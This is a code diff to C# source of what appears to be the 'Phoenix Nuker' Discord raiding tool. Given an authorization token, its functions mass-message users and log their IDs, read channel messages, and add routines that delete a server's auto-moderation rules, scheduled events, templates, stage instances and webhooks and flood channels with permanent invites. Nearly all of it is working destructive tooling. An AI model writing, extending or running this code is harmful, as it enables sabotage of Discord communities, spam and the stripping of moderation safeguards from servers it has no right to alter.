@@ -365,13 +365,13 @@ namespace nuker
                 using (HttpRequest req = new HttpRequest())
                 {
                     req.AddHeader("Authorization", token);
-                    HttpResponse request = req.Get($"https://discord.com/api/v{Config.APIVersion}/guilds/{guildid}/channels");
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
                     var array = JArray.Parse(request.ToString());
                     req.Close();
                     foreach (dynamic entry in array)
                     {
                         req.AddHeader("Authorization", token);
-                        HttpResponse request2 = req.Get($"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages?limit=100");
+                        HttpResponse request2 = req.Get($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages?limit=100");
                         var array2 = JArray.Parse(request2.ToString());
                         Console.WriteLine(array2);
                         Console.ReadKey();
@@ -405,16 +405,16 @@ namespace nuker
                 {
                     HttpClient client = new HttpClient();
                     client.DefaultRequestHeaders.Add("Authorization", token);
-                    client.BaseAddress = new Uri($"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
+                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/users/@me/channels");
                     client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
-                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
+                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/users/@me/channels");
                     request.Content = new System.Net.Http.StringContent($"{{\"recipient_id\":\"{id}\"}}", Encoding.UTF8, "application/json");
                     client.SendAsync(request).Wait();
                 }
                 using (HttpRequest req = new HttpRequest())
                 {
                     req.AddHeader("Authorization", token);
-                    HttpResponse r3quest = req.Get($"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
+                    HttpResponse r3quest = req.Get($"https://discord.com/api/v{apiv}/users/@me/channels");
                     var array = JArray.Parse(r3quest.ToString());
                     req.Close();
                     foreach (dynamic entry in array)
@@ -424,7 +424,7 @@ namespace nuker
                         {
                             HttpClient client2 = new HttpClient();
                             client2.DefaultRequestHeaders.Add("Authorization", token);
-                            client2.BaseAddress = new Uri($"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages");
+                            client2.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                             client2.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                             HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages");
                             request2.Content = new System.Net.Http.StringContent($"{{\"content\":\"{message}\"}}", Encoding.UTF8, "application/json");
@@ -433,6 +433,160 @@ namespace nuker
                             Thread.Sleep(200);
                             File.AppendAllText("dmed.txt", id + Environment.NewLine);
                         }
+                    }
+                }
+            }
+            catch { }
+        }
+
+
+        public static void DeleteAutoModerationRules(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/auto-moderation/rules");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/auto-moderation/rules/" + entry["id"]);
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/auto-moderation/rules/" + entry["id"]);
+                        client.SendAsync(request2);
+                        Console.WriteLine("Deleted: " + entry["name"]);
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void CreateInvite(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/invites");
+                        client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/channels/{entry.id}/invites");
+                        request2.Content = new System.Net.Http.StringContent($"{{\"max_age\": 0}}", Encoding.UTF8, "application/json");
+                        client.SendAsync(request2).Wait();
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void DeleteGuildScheduledEvents(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/scheduled-events");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/scheduled-events/{entry.id}");
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/scheduled-events/{entry.id}");
+                        client.SendAsync(request2).Wait();
+                        Console.WriteLine("Deleted: " + entry["name"]);
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void DeleteGuildTemplate(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/templates");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/templates/{entry.code}");
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/templates/{entry.code}");
+                        client.SendAsync(request2).Wait();
+                        Console.WriteLine("Deleted: " + entry["name"]);
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void DeleteStageInstances(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/stage-instances/{entry.id}");
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/stage-instances/{entry.id}");
+                        client.SendAsync(request2).Wait();
+                        Thread.Sleep(WaitTimeShort);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void DeleteWebhooks(string token, string guildid)
+        {
+            try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.AddHeader("Authorization", token);
+                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/webhooks");
+                    var array = JArray.Parse(request.ToString());
+                    req.Close();
+                    foreach (dynamic entry in array)
+                    {
+                        HttpClient client = new HttpClient();
+                        client.DefaultRequestHeaders.Add("Authorization", token);
+                        client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
+                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/webhooks/{entry.id}");
+                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/webhooks/{entry.id}");
+                        client.SendAsync(request2).Wait();
+                        Console.WriteLine("Deleted: " + entry["name"]);
+                        Thread.Sleep(WaitTimeShort);
                     }
                 }
             }
